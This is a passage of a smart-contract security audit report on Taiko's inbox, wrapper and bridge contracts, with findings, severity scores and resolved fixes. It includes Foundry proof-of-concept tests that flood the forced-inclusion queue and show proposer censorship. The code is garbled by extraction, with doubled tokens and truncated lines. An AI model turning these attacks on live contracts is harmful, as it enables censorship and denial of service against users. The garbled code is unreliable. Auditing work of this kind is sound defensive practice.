console    console.loglog("Total cost (USD): $%s""Total cost (USD): $%s", totalCostUsd totalCostUsd);
console    console.loglog("------------------------------------------------""------------------------------------------------");


console    console.loglog("Alice balance before attack: %s wei""Alice balance before attack: %s wei", Alice Alice.balancebalance)


uint256uint256 startGas startGas = gasleftgasleft();


// Create the specified number of forced inclusions with invalid // Create the specified number of forced inclusions with invalid

forfor (uint16uint16 i i = 0; i i < numRequests numRequests; i i++++) {
store      store.storeForcedInclusionstoreForcedInclusion{ value value: feeInWei feeInWei }({
blobIndex        blobIndex: uint8uint8(i i % 256256), // Cycle through blob indexes// Cycle through blob indexes

blobByteOffset        blobByteOffset: typetype(uint32uint32).maxmax, // Invalid offset// Invalid offset

blobByteSize        blobByteSize: typetype(uint32uint32).max max // Invalid size// Invalid size

});


// Print progress every 100 requests// Print progress every 100 requests

ifif (i i % 100100 ==== 0) {
console        console.loglog("Created %s forced inclusions""Created %s forced inclusions", i i);
}
}


uint256uint256 gasUsed gasUsed = startGas startGas - gasleftgasleft();


console    console.loglog("Alice balance after attack: %s wei""Alice balance after attack: %s wei", Alice Alice.balancebalance);
console    console.loglog("Gas used for the attack: %s""Gas used for the attack: %s", gasUsed gasUsed);


// Verify all requests are in the queue// Verify all requests are in the queue

assertEqassertEq(storestore.tailtail(), numRequests numRequests);


// Estimate impact on the system// Estimate impact on the system

uint8uint8 delayValue delayValue = store store.inclusionDelayinclusionDelay();
console    console.loglog("Forced inclusion delay parameter: %s batches""Forced inclusion delay parameter: %s batches", delay delay


// Calculate how many batches would be affected// Calculate how many batches would be affected

uint256uint256 batchesBlocked batchesBlocked = numRequests numRequests;


// Assuming each batch takes ~12 seconds (typical Ethereum block // Assuming each batch takes ~12 seconds (typical Ethereum block

uint256uint256 blockTimeSeconds blockTimeSeconds = 1212;
uint256uint256 timeBlocked timeBlocked = batchesBlocked batchesBlocked * blockTimeSeconds blockTimeSeconds;


console    console.loglog("System impact:""System impact:");
console    console.loglog("- Queue flooded with %s invalid requests""- Queue flooded with %s invalid requests", numReques numReques

console    console.loglog("- Legitimate forced inclusions delayed by approximat"- Legitimate forced inclusions delayed by approximat

console    console.loglog("- That's approximately %s minutes or %s hours""- That's approximately %s minutes or %s hours", time time

}


Here is the result demonstrating that it's possible to flood the system (200$ for 420 inclusions):

### BVSS AO:A/AC:M/AX:L/R:N/S:U/C:N/A:H/I:M/D:N/Y:N (5.9) Recommendation


It is recommended to either :


Add validation for blob parameters to reject obviously invalid inputs.

Implement a rate-limiting mechanism to prevent rapid queue filling.

Increment the fees for submitting a lot of forced inclusions.

### Remediation Comment


SOLVED : The **Taiko team** solved the issue allowing `storeForcedInclusion` to be called only once per

Ethereum transaction, rendering the cost to queue a TX to be the cost of posting a blob.


### Remediation Hash

<u>[https://github.com/taikoxyz/taiko-mono/pull/19070/commits/07ccdc76994c0cd4218f942d6ce5df3](https://github.com/taikoxyz/taiko-mono/pull/19070/commits/07ccdc76994c0cd4218f942d6ce5df3b553d533e)</u>

<u>[b553d533e](https://github.com/taikoxyz/taiko-mono/pull/19070/commits/07ccdc76994c0cd4218f942d6ce5df3b553d533e)</u>


### 8.4 INSUFFICIENT VALIDATION IN TAIKOWRAPPER ALLOWS TRANSACTION CENSORSHIP IN FORCED INCLUSIONS // MEDIUM Description

The **TaikoWrapper** contract implements a forced inclusion mechanism that enables users to pay a fee

to ensure their transactions are included in a block. However, the current implementation only

validates that the correct blob is referenced and that a minimum number of transactions are

processed, without ensuring that specific or all transactions from the forced inclusion are actually

included:


forfor (uint256uint256 i i; i i < numBlocks numBlocks; ++++i) {
// Need to make sure enough transactions in the forced inclusion requ// Need to make sure enough transactions in the forced inclusion requ

requirerequire(p.blocksblocks[i].numTransactions numTransactions >=>= MIN_TXS_PER_FORCED_INCLUSION MIN_TXS_PER_FORCED_INCLUSION,
}


While the code validates the `blob_hash`, `byte_offset`, and `size`, it only enforces a minimum number
of transactions (512 as defined by `MIN_TXS_PER_FORCED_INCLUSION` constant) without verifying

which specific transactions from the blob are included:


requirerequire(p.blobParamsblobParams.blobHashesblobHashes.length length ==== 1, InvalidBlobHashesSizeInvalidBlobHashesSize());
requirerequire(p.blobParamsblobParams.blobHashesblobHashes[0] ==== inclusion inclusion.blobHashblobHash, InvalidBlobHashInvalidBlobHash

requirerequire(p.blobParamsblobParams.byteOffset byteOffset ==== inclusion inclusion.blobByteOffsetblobByteOffset, InvalidBlobBInvalidBlobB

requirerequire(p.blobParamsblobParams.byteSize byteSize ==== inclusion inclusion.blobByteSizeblobByteSize, InvalidBlobByteSInvalidBlobByteS


Block proposers maintain full discretion over which transactions from the forced inclusion blob are

processed. This means a proposer can:

1. Censor specific high-value or competing transactions while still satisfying the minimum

transaction count requirement.

2. Selectively include only the transactions that benefit them.

3. Entirely undermine the purpose of forced inclusion by excluding precisely those transactions users

paid to prioritize.


This vulnerability defeats the core purpose of the forced inclusion mechanism, which is to guarantee

that specific transactions are processed when users pay for this service.

### Proof of Concept


A new test file has been created (some parties are mocked):


functionfunction setUpOnEthereumsetUpOnEthereum() internalinternal override override {
bondToken     bondToken = deployBondTokendeployBondToken();
super    super.setUpOnEthereumsetUpOnEthereum();


// Deploy our test contracts// Deploy our test contracts

forcedInclusionStore     forcedInclusionStore = newnew ForcedInclusionStoreForcedInclusionStore(
INCLUSION_DELAY      INCLUSION_DELAY,
FEE_IN_GWEI      FEE_IN_GWEI,
addressaddress(inboxinbox),
addressaddress(thisthis) // Using this contract as inboxWrapper for tes// Using this contract as inboxWrapper for tes

);


wrapper     wrapper = newnew TaikoWrapperTaikoWrapper(
addressaddress(inboxinbox),
addressaddress(forcedInclusionStoreforcedInclusionStore),
addressaddress(0) // No preconf router needed// No preconf router needed

);
}


// Override for testing to mock the blob hash// Override for testing to mock the blob hash

functionfunction _blobHash_blobHash(uint8uint8 index index) internalinternal purepure returnsreturns (bytes32bytes32) {
ifif (index index ==== 1) {
returnreturn keccak256keccak256("user_important_transactions""user_important_transactions");
}
returnreturn bytes32bytes32(0);
}


//E forge test --match-test "test_forced_inclusion_allows_transaction//E forge test --match-test "test_forced_inclusion_allows_transaction

functionfunction test_forced_inclusion_allows_transaction_censorshiptest_forced_inclusion_allows_transaction_censorship() externextern

// Create two very different transaction sets// Create two very different transaction sets

bytesbytes memorymemory userTransactions userTransactions = abi abi.encodePackedencodePacked(
"send_100_tokens_to_alice""send_100_tokens_to_alice",
"create_important_contract""create_important_contract",
"vote_on_governance_proposal""vote_on_governance_proposal"

);


bytesbytes memorymemory proposerTransactions proposerTransactions = abi abi.encodePackedencodePacked(
"unrelated_transaction_1""unrelated_transaction_1",
"unrelated_transaction_2""unrelated_transaction_2",
"unrelated_transaction_3""unrelated_transaction_3"

);


// These transaction sets should have different hashes// These transaction sets should have different hashes


bytes32bytes32 userTxHash userTxHash = keccak256keccak256(userTransactionsuserTransactions);
bytes32bytes32 proposerTxHash proposerTxHash = keccak256keccak256(proposerTransactionsproposerTransactions);
assertFalseassertFalse(userTxHash userTxHash ==== proposerTxHash proposerTxHash, "Transaction sets shoul"Transaction sets shoul


console    console.loglog("User transaction hash:""User transaction hash:", vm vm.toStringtoString(userTxHashuserTxHash));
console    console.loglog("Proposer transaction hash:""Proposer transaction hash:", vm vm.toStringtoString(proposerTxHproposerTxH


// Setup: User submits a forced inclusion request for their trans// Setup: User submits a forced inclusion request for their trans

// For testing, we'll manually create the forced inclusion record// For testing, we'll manually create the forced inclusion record

bytes32bytes32 blobHash blobHash = _blobHash_blobHash(1); // Mock blob hash for user's tra// Mock blob hash for user's tra


IForcedInclusionStore    IForcedInclusionStore.ForcedInclusion ForcedInclusion memorymemory inclusion inclusion = IForcedI IForcedI

blobHash      blobHash: blobHash blobHash,
feeInGwei      feeInGwei: FEE_IN_GWEI FEE_IN_GWEI,
createdAtBatchId      createdAtBatchId: 1,
blobByteOffset      blobByteOffset: 0,
blobByteSize      blobByteSize: 10241024,
blobCreatedIn      blobCreatedIn: uint64uint64(blockblock.numbernumber)
});


// Mock the consumeOldestForcedInclusion to return our test inclu// Mock the consumeOldestForcedInclusion to return our test inclu

vm    vm.mockCallmockCall(
addressaddress(forcedInclusionStoreforcedInclusionStore),
abi      abi.encodeWithSelectorencodeWithSelector(
IForcedInclusionStore        IForcedInclusionStore.consumeOldestForcedInclusionconsumeOldestForcedInclusion.selectselect

addressaddress(thisthis)
),
abi      abi.encodeencode(inclusioninclusion)
);


// Mock isOldestForcedInclusionDue to return true// Mock isOldestForcedInclusionDue to return true

vm    vm.mockCallmockCall(
addressaddress(forcedInclusionStoreforcedInclusionStore),
abi      abi.encodeWithSelectorencodeWithSelector(IForcedInclusionStoreIForcedInclusionStore.isOldestForcedInisOldestForcedIn

abi      abi.encodeencode(truetrue)
);


// Create batch parameters that match the forced inclusion metada// Create batch parameters that match the forced inclusion metada

// But will include proposer's transactions instead of user's// But will include proposer's transactions instead of user's


// First create the forced inclusion batch parameters// First create the forced inclusion batch parameters

ITaikoInbox    ITaikoInbox.BlockParams BlockParams memorymemory blockParams blockParams = ITaikoInbox ITaikoInbox.BlockParBlockPar

numTransactions      numTransactions: 600600, // More than MIN_TXS_PER_FORCED_INCLUSI// More than MIN_TXS_PER_FORCED_INCLUSI

timeShift      timeShift: 1,


signalSlots      signalSlots: newnew bytes32bytes32[](0)
});


ITaikoInbox    ITaikoInbox.BlockParamsBlockParams[] memorymemory blocks blocks = newnew ITaikoInboxITaikoInbox.BlockPaBlockPa

blocks    blocks[0] = blockParams blockParams;


ITaikoInbox    ITaikoInbox.BlobParams BlobParams memorymemory blobParams blobParams = ITaikoInbox ITaikoInbox.BlobParamsBlobParams

blobHashes      blobHashes: newnew bytes32bytes32[](1),
firstBlobIndex      firstBlobIndex: 0,
numBlobs      numBlobs: 0,
byteOffset      byteOffset: 0,
byteSize      byteSize: 10241024,
createdIn      createdIn: uint64uint64(blockblock.numbernumber)
});
blobParams    blobParams.blobHashesblobHashes[0] = blobHash blobHash; // Using the correct blob ha// Using the correct blob ha


ITaikoInbox    ITaikoInbox.BatchParams BatchParams memorymemory batchParams batchParams = ITaikoInbox ITaikoInbox.BatchParBatchPar

proposer      proposer: addressaddress(thisthis),
coinbase      coinbase: addressaddress(thisthis),
parentMetaHash      parentMetaHash: bytes32bytes32(0),
anchorBlockId      anchorBlockId: 0,
lastBlockTimestamp      lastBlockTimestamp: 0,
revertIfNotFirstProposal      revertIfNotFirstProposal: falsefalse,
blobParams      blobParams: blobParams blobParams,
blocks      blocks: blocks blocks

});


// Second batch parameters (normal batch)// Second batch parameters (normal batch)

ITaikoInbox    ITaikoInbox.BatchParams BatchParams memorymemory normalBatchParams normalBatchParams = ITaikoInbox ITaikoInbox.BaBa

proposer      proposer: addressaddress(0),
coinbase      coinbase: addressaddress(0),
parentMetaHash      parentMetaHash: bytes32bytes32(0),
anchorBlockId      anchorBlockId: 0,
lastBlockTimestamp      lastBlockTimestamp: 0,
revertIfNotFirstProposal      revertIfNotFirstProposal: falsefalse,
blobParams      blobParams: ITaikoInbox ITaikoInbox.BlobParamsBlobParams({
blobHashes        blobHashes: newnew bytes32bytes32[](0),
firstBlobIndex        firstBlobIndex: 0,
numBlobs        numBlobs: 0,
byteOffset        byteOffset: 0,
byteSize        byteSize: 0,
createdIn        createdIn: 0
}),
blocks      blocks: newnew ITaikoInboxITaikoInbox.BlockParamsBlockParams[](0)


});


// Mock the inbox.proposeBatch call to avoid actual calls// Mock the inbox.proposeBatch call to avoid actual calls

vm    vm.mockCallmockCall(
addressaddress(inboxinbox),
abi      abi.encodeWithSelectorencodeWithSelector(ITaikoInboxITaikoInbox.proposeBatchproposeBatch.selectorselector),
abi      abi.encodeencode(
ITaikoInbox        ITaikoInbox.BatchInfoBatchInfo({
txsHash          txsHash: bytes32bytes32(0),
blocks          blocks: blocks blocks,
blobHashes          blobHashes: newnew bytes32bytes32[](0),
extraData          extraData: bytes32bytes32(0),
coinbase          coinbase: addressaddress(0),
proposedIn          proposedIn: 0,
blobCreatedIn          blobCreatedIn: 0,
blobByteOffset          blobByteOffset: 0,
blobByteSize          blobByteSize: 0,
gasLimit          gasLimit: 0,
lastBlockId          lastBlockId: 0,
lastBlockTimestamp          lastBlockTimestamp: 0,
anchorBlockId          anchorBlockId: 0,
anchorBlockHash          anchorBlockHash: bytes32bytes32(0),
baseFeeConfig          baseFeeConfig: LibSharedData LibSharedData.BaseFeeConfigBaseFeeConfig({
adjustmentQuotient            adjustmentQuotient: 0,
sharingPctg            sharingPctg: 0,
gasIssuancePerSecond            gasIssuancePerSecond: 0,
minGasExcess            minGasExcess: 0,
maxGasIssuancePerBlock            maxGasIssuancePerBlock: 0
})
}),
ITaikoInbox        ITaikoInbox.BatchMetadataBatchMetadata({
infoHash          infoHash: bytes32bytes32(0),
proposer          proposer: addressaddress(0),
batchId          batchId: 0,
proposedAt          proposedAt: 0
})
)
);


// Now call proposeBatch with the proposer's transactions// Now call proposeBatch with the proposer's transactions

// This should succeed despite using different transactions than // This should succeed despite using different transactions than

wrapper    wrapper.proposeBatchproposeBatch(
abi      abi.encodeencode(abiabi.encodeencode(batchParamsbatchParams), abi abi.encodeencode(normalBatchParnormalBatchPar

proposerTransactions      proposerTransactions


);


console    console.loglog("User paid for forced inclusion of their transactions"User paid for forced inclusion of their transactions

console    console.loglog("Proposer didn't included forced transactions""Proposer didn't included forced transactions");
console    console.loglog("TaikoWrapper validation passed because it only check"TaikoWrapper validation passed because it only check

console    console.loglog("\t1. The blob hash matches""\t1. The blob hash matches");
console    console.loglog("\t2. Number of transactions exceeds minimum (512)""\t2. Number of transactions exceeds minimum (512)");
console    console.loglog("\t3. Other blob parameters match""\t3. Other blob parameters match");
console    console.loglog("But it NEVER verifies the actual transaction content"But it NEVER verifies the actual transaction content

}


Result which demonstrate a proposer can still choose if he wants to include a forced inclusion or not:

### BVSS AO:A/AC:L/AX:M/R:N/S:U/C:N/A:N/I:H/D:N/Y:N (5.0) Recommendation


It is recommended to enhance the validation mechanism to ensure all transactions from the forced

inclusion blob are properly included. Specific improvements include:

1. Implement a transaction commitment verification system where the TXs are included if forced.

2. Modify the verification logic to process the entire blob content without allowing selection.

### Remediation Comment


SOLVED: The **Taiko team** implemented a fix that allows only the proposer to adjust the number of

transactions included from the forced inclusions queue.


### Remediation Hash

<u>[https://github.com/taikoxyz/taiko-mono/pull/19013/commits/3e9cd7333311b7eeaf726d8805480ae](https://github.com/taikoxyz/taiko-mono/pull/19013/commits/3e9cd7333311b7eeaf726d8805480ae3df22cdc2)</u>

<u>[3df22cdc2](https://github.com/taikoxyz/taiko-mono/pull/19013/commits/3e9cd7333311b7eeaf726d8805480ae3df22cdc2)</u>


### 8.5 MISSING PAYABLE MODIFIER IN PROPOSEBATCH FUNCTION // MEDIUM Description

The `proposeBatch` function in TaikoInbox.sol is missing the `payable` modifier, yet its implementation
attempts to handle native token deposits through the `_debitBond` and `_handleDeposit` functions:


functionfunction proposeBatchproposeBatch(
bytesbytes calldatacalldata _params _params, //E ABI-encoded BlockParams//E ABI-encoded BlockParams

bytesbytes calldatacalldata _txList _txList //E The transaction list in calldata. If the t//E The transaction list in calldata. If the t

) publicpublic overrideoverride(ITaikoInboxITaikoInbox, IProposeBatch IProposeBatch) nonReentrant nonReentrant returnsreturns (BatchBatch

{


// Function implementation... //// Function implementation... //


_debitBond_debitBond(paramsparams.proposerproposer, livenessBond livenessBond);
}


The issue arises because the `debitBond` function (called from `proposeBatch` ) attempts to handle
cases where a user's balance is insufficient by calling `handleDeposit` :


functionfunction _debitBond_debitBond(addressaddress _user _user, uint256uint256 _amount _amount) privateprivate {
ifif (_amount _amount ==== 0) returnreturn;
ifif (balance balance >=>= _amount _amount) {
unchecked    unchecked {
state    state.bondBalancebondBalance[_user_user] = balance balance - _amount _amount;
}
} elseelse {
//E @audit handle missing bond//E @audit handle missing bond

uint256uint256 amountDeposited amountDeposited = _handleDeposit_handleDeposit(_user_user, _amount _amount);
requirerequire(amountDeposited amountDeposited ==== _amount _amount, InsufficientBondInsufficientBond());
}
emitemit BondDebitedBondDebited(_user_user, _amount _amount);
}


The `_handleDeposit` function has logic to accept Ether payments when `bondToken` is not set:


functionfunction _handleDeposit_handleDeposit(addressaddress _user _user,uint256uint256 _amount _amount) privateprivate returnsreturns (u
{
ifif (bondToken bondToken !=!= addressaddress(0)) {
requirerequire(msgmsg.value value ==== 0, MsgValueNotZeroMsgValueNotZero());


uint256uint256 balance balance = IERC20IERC20(bondTokenbondToken).balanceOfbalanceOf(addressaddress(thisthis));
IERC20IERC20(bondTokenbondToken).safeTransferFromsafeTransferFrom(_user_user, addressaddress(thisthis), _amount _amount)
amountDeposited_     amountDeposited_ = IERC20IERC20(bondTokenbondToken).balanceOfbalanceOf(addressaddress(thisthis)) - b b

} elseelse {
//E @audit allow msg.value but does not implement payable//E @audit allow msg.value but does not implement payable

requirerequire(msgmsg.value value ==== _amount _amount, EtherNotPaidAsBondEtherNotPaidAsBond());
amountDeposited_     amountDeposited_ = _amount _amount;
}
emitemit BondDepositedBondDeposited(_user_user, amountDeposited_ amountDeposited_);
}


However, without the `payable` modifier on `proposeBatch`, any call with Ether will revert before

reaching the internal logic, preventing the native token bond mechanism from working correctly.


** This is also true for TaikoWrapper.sol


As an impact, users cannot provide liveness bonds using native tokens (Ether) when calling

`proposeBatch` directly, rendering the implementation inconsistent, as it contains logic to handle
Ether deposits but doesn't allow receiving them. Users with insufficient balance in `bondBalance`

mapping cannot propose batches when the system is configured to use native tokens as bonds.

### BVSS AO:A/AC:L/AX:L/R:N/S:U/C:N/A:M/I:N/D:N/Y:N (5.0) Recommendation


It is recommended to add the `payable` modifier to the `proposeBatch()` function in TaikoInbox.sol, do
the same for `TaikoWrapper.sol#proposeBatch()` and forward `msg.value` to TaikoInBox.

### Remediation Comment


SOLVED : The **Taiko team** made it explicit that Ether as bond must be deposited beforehand by

reverting if it's not the case.

### Remediation Hash


<u>[https://github.com/taikoxyz/taiko-mono/commit/a7cf79e127e9a8f1b792db5f77731d7ef744ea6b](https://github.com/taikoxyz/taiko-mono/commit/a7cf79e127e9a8f1b792db5f77731d7ef744ea6b)</u>


### 8.6 ERC20 TOKENS BECOME UNRECOVERABLE IN BRIDGE RETRY MECHANISM FOR SPECIAL ADDRESSES // MEDIUM Description

When a user sets the `to` parameter to `address(0)` or `address(ERC20Vault.sol)` the TX will revert

when received on the destination bridge:


functionfunction onMessageInvocationonMessageInvocation(
bytesbytes calldatacalldata _data _data //E data for this contract to interpret//E data for this contract to interpret

) publicpublic payablepayable whenNotPaused nonReentrant whenNotPaused nonReentrant {


//E decode data message received//E decode data message received

(
CanonicalERC20       CanonicalERC20 memorymemory ctoken ctoken,
addressaddress fromfrom,
addressaddress to to,
uint256uint256 amount amount,
uint256uint256 solverFee solverFee,
bytes32bytes32 solverCondition solverCondition //E hash of solver condition for the //E hash of solver condition for the

) = abi abi.decodedecode(_data_data, (CanonicalERC20CanonicalERC20, addressaddress, addressaddress, uint256uint256,


IBridge    IBridge.Context Context memorymemory ctx ctx = checkProcessMessageContextcheckProcessMessageContext();


// @audit Don't allow sending to disallowed addresses.// @audit Don't allow sending to disallowed addresses.

// Don't send the tokens back to `from` because `from` is on the // Don't send the tokens back to `from` because `from` is on the

//E if (_to == address(0) || _to == address(this)) revert VAU//E if (_to == address(0) || _to == address(this)) revert VAU

checkToAddresscheckToAddress(toto);
...
}


When a message fails like this, the bridge (which was not in the scope of this audit) has 2 paths to
handle the failing transaction, one of them is via `retryMessage` function. However, the Bridge

contract's retry mechanism fails to properly handle ERC20 token recovery when the message
destination ( `_message.to` ) is either `address(0)` or the Bridge contract itself ( `address(this)` ).


In the `retryMessage()` function, the code takes different paths based on the destination address:


functionfunction retryMessageretryMessage(
Message   Message calldatacalldata _message _message,
boolbool _isLastAttempt _isLastAttempt

)
externalexternal

sameChainsameChain(_message_message.destChainIddestChainId)
diffChaindiffChain(_message_message.srcChainIdsrcChainId)
whenNotPaused  whenNotPaused

nonReentrant  nonReentrant

{


ifif (_unableToInvokeMessageCall_unableToInvokeMessageCall(_message_message, signalService signalService)) {
succeeded   succeeded = _message _message.destOwnerdestOwner.sendEthersendEther(_message_message.valuevalue, _SEND_ETHER_ _SEND_ETHER_

} elseelse {
succeeded   succeeded = _invokeMessageCall_invokeMessageCall(_message_message, msgHash msgHash, gasleftgasleft(), falsefalse);
}


When the destination is a special address (by error) like `address(0)` or `address(this)`, the function

`_unableToInvokeMessageCall()` returns true:


functionfunction _unableToInvokeMessageCall_unableToInvokeMessageCall(
Message   Message calldatacalldata _message _message,
ISignalService _signalService  ISignalService _signalService

)
privateprivate

viewview

returnsreturns (boolbool)
{
ifif (_message_message.to to ==== addressaddress(0)) returnreturn truetrue;
ifif (_message_message.to to ==== addressaddress(thisthis)) returnreturn truetrue;
ifif (_message_message.to to ==== addressaddress(_signalService_signalService)) returnreturn truetrue;
// ...// ...

}


This results in only Ether being sent to the destination owner while bypassing the token-specific logic
in the ERC20Vault's `onMessageInvocation()` . If the message status is updated to DONE or FAILED,

the tokens become permanently locked.

### BVSS


### AO:A/AC:L/AX:L/R:N/S:U/C:N/A:N/I:N/D:M/Y:N (5.0) Recommendation

It is recommended to move the `checkToAddress(to);` to the `sendToken()` function of the

ERC20Vault.sol to prevent this scenario from happening.

### Remediation Comment


SOLVED : The **Taiko team** implemented a new function in order to check the `to` address when tokens

are sent.

### Remediation Hash


<u>[https://github.com/taikoxyz/taiko-mono/pull/19040/commits/33d1bb7bb1e3c830b46a042c7152e2d](https://github.com/taikoxyz/taiko-mono/pull/19040/commits/33d1bb7bb1e3c830b46a042c7152e2d6c4c07439)</u>

<u>[6c4c07439](https://github.com/taikoxyz/taiko-mono/pull/19040/commits/33d1bb7bb1e3c830b46a042c7152e2d6c4c07439)</u>


### 8.7 INABILITY TO SUBMIT IDENTICAL PROOFS LEADS TO UNNECESSARY REJECTIONS // LOW Description

In the `proveBatches` function of the TaikoInbox contract, when a prover submits a proof for multiples

transitions and one of them is identical to an existing one (same blockHash and stateRoot), the
transaction reverts with the `SameTransition()` error:


boolbool isSameTransition isSameTransition = _ts _ts.blockHash blockHash ==== tran tran.blockHash blockHash &&&& (_ts_ts.stateRootstateRoot

requirerequire(!isSameTransitionisSameTransition, SameTransitionSameTransition());


hasConflictingProof hasConflictingProof = truetrue;
emitemit ConflictingProofConflictingProof(metameta.batchIdbatchId, _ts _ts, tran tran);


This behavior prevents provers from submitting proofs that validate the same state transition that

has already been proven.


A proper implementation could:

1. Accept identical proofs (do nothing)

2. Only flag conflicts when the blockHash or stateRoot actually differ

3. Only emit the ConflictingProof event for genuine conflicts

### BVSS AO:A/AC:L/AX:L/R:N/S:U/C:N/A:L/I:L/D:N/Y:N (3.1) Recommendation


It is recommended to modify the conflict detection logic to accept identical proofs while only pausing

the system for genuine conflicts.

### Remediation Comment


SOLVED : The **Taiko team** solved the issue by allowing a same transition to be in the loop of batches

currently proved but not modified.

### Remediation Hash


<u>[https://github.com/taikoxyz/taiko-mono/pull/19056/commits/7c946115166dd850fd6492fda7473f8](https://github.com/taikoxyz/taiko-mono/pull/19056/commits/7c946115166dd850fd6492fda7473f83574cb659)</u>

<u>[3574cb659](https://github.com/taikoxyz/taiko-mono/pull/19056/commits/7c946115166dd850fd6492fda7473f83574cb659)</u>


### 8.8 RESET OF TRANSITION CREATION TIMESTAMP ON CONFLICTING PROOFS // LOW Description

In the `TaikoInbox.sol` contract, when a conflicting transition proof is submitted in the

`proveBatches` function, the system overwrites the `createdAt` timestamp of the existing transition

with the current block timestamp:


TransitionState TransitionState storagestorage ts ts = state state.transitionstransitions[slotslot][tidtid];


tsts.blockHash blockHash = tran tran.blockHashblockHash;
tsts.stateRoot stateRoot = meta meta.batchId batchId % config config.stateRootSyncInternal stateRootSyncInternal ==== 0 ? tran tran.stst

tsts.inProvingWindow inProvingWindow = inProvingWindow inProvingWindow;
tsts.prover prover = inProvingWindow inProvingWindow ? meta meta.proposer proposer : msg msg.sendersender;
tsts.createdAt createdAt = uint48uint48(blockblock.timestamptimestamp);


The timestamp reset occurs regardless of whether this is a new transition or an overwriting of an

existing one. This behavior has direct implications on the batch verification process, as seen in the

`_verifyBatches` function:


unchecked unchecked {
ifif (tsts.createdAt createdAt + _config _config.cooldownWindow cooldownWindow > block block.timestamptimestamp) {
breakbreak;
}
}

### BVSS AO:A/AC:L/AX:L/R:N/S:U/C:N/A:N/I:L/D:N/Y:N (2.5) Recommendation


It is recommended to implement separate tracking for the original creation timestamp and
subsequent updates by adding a new field `lastUpdatedAt` to the `TransitionState` struct to track

when conflicting /updated proofs are submitted.

### Remediation Comment


SOLVED : The **Taiko team** solved the issue by resetting a conflict transition, which enforces the

transition to be proved again when contract is unpaused.

### Remediation Hash


<u>[https://github.com/taikoxyz/taiko-mono/pull/19017/commits/e913a2cc3a4b6c4dc1dc1ca65ae5a25](https://github.com/taikoxyz/taiko-mono/pull/19017/commits/e913a2cc3a4b6c4dc1dc1ca65ae5a2505558c85d)</u>

<u>[05558c85d](https://github.com/taikoxyz/taiko-mono/pull/19017/commits/e913a2cc3a4b6c4dc1dc1ca65ae5a2505558c85d)</u>


### 8.9 UNUSED _ CONSUMETOKENQUOTA FUNCTION IN ERC20VAULT CONTRACT // INFORMATIONAL Description

The ERC20Vault contract contains an unused private function `_consumeTokenQuota()` which is

defined but never called from any other function within the contract. This function appears to be

intended to leverage a quota management mechanism for token transfers, but remains entirely

unused in the current implementation.


functionfunction _consumeTokenQuota_consumeTokenQuota(addressaddress _token _token, uint256uint256 _amount _amount) privateprivate {
addressaddress quotaManager quotaManager = resolveresolve(LibStringsLibStrings.B_QUOTA_MANAGERB_QUOTA_MANAGER, truetrue);
ifif (quotaManager quotaManager !=!= addressaddress(0)) {
IQuotaManagerIQuotaManager(quotaManagerquotaManager).consumeQuotaconsumeQuota(_token_token, _amount _amount);
}
}


The ERC20Vault contract still deploys with this code, incurring unnecessary gas costs during

deployment. Additionally, the presence of unused code can lead to confusion during future

maintenance or auditing efforts, as developers might assume it serves a purpose in the system's

operation.

### BVSS AO:A/AC:L/AX:L/R:N/S:U/C:N/A:N/I:N/D:N/Y:N (0.0) Recommendation


It is recommended to remove the unused `_consumeTokenQuota()` function entirely from the

ERC20Vault if not used.

### Remediation Comment


SOLVED : The **Taiko team** removed the unused code.

### Remediation Hash


<u>[https://github.com/taikoxyz/taiko-mono/pull/19064/commits/a3f172173e2a662670865a7a18172e](https://github.com/taikoxyz/taiko-mono/pull/19064/commits/a3f172173e2a662670865a7a18172e74c69d7956)</u>

<u>[74c69d7956](https://github.com/taikoxyz/taiko-mono/pull/19064/commits/a3f172173e2a662670865a7a18172e74c69d7956)</u>


Halborn strongly recommends conducting a follow-up assessment of the project either within six months or
immediately following any material changes to the codebase, whichever comes first. This approach is crucial for
maintaining the project’s integrity and addressing potential vulnerabilities introduced by code modifications.


